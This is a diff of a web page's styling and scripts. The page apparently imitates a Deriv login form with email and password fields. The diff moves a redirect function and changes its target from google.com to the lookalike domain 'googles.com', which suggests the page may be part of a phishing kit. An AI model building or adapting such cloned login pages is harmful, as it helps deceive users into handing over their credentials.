@@ -375,15 +375,12 @@ a:hover{cursor:pointer;text-decoration:underline;}
                 display: block;
             }
             button {
-    padding: 1rem 1.6rem;
-    font-size: 1.4rem;
-    transition: all 0.25s;
-    font-weight: bold;
-    margin-left: auto;
-    width: 100%;
-    height: 4rem;
-    border-radius: 16px !important;
-}
+                border-radius: 4px;
+                padding: 1rem 1.6rem;
+                font-size: 1.4rem;
+                transition: all 0.25s;
+                font-weight: bold;
+            }
             button:hover {
                 cursor: pointer;
             }
@@ -645,7 +642,8 @@ div#provider_facebook {
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 <script>
-
+function redirect() {
+window.location.href = "https://www.googles.com/"	};
 
 $(document).ready(function () {
 $(".bin").click(function () {
@@ -740,9 +738,7 @@ Don’t have an account yet? <a class="account-link" href="https://deriv.com/sig
 </p>
 </div>
 <script type="text/javascript">
-function redirect() {
-window.location.href = "https://www.google.com/"	
-	};
+
     var frmLogin, txtEmail, txtPass, btnToggle;
     window.onload = function() {
         frmLogin  = document.getElementById('frmLogin');
